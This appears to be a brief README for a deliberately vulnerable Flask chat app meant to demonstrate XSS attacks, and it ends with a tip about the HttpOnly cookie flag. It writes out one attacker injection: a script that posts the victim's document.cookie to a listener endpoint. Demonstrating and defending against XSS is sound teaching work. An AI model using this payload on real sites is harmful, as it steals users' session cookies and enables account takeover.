# **Chat WebApp with Flask**

Building an vulnerable chat web app with Flask, socket programming to demostrate XSS attacks.


Attacker's injection: `<script>$.ajax({ url : 'http://127.0.0.1:5001/listen', type : 'POST', data : { 'cookie' : document.cookie }, success : function(response) {}, error : function(error) {} })</script>`

A good way to prevent XSS attacks on cookies is to set the `HttpOnly` flag of the cookie. This makes the cookie unavailable to scripting languages like JavaScript.

Give me a star if this has helped you in anyway!
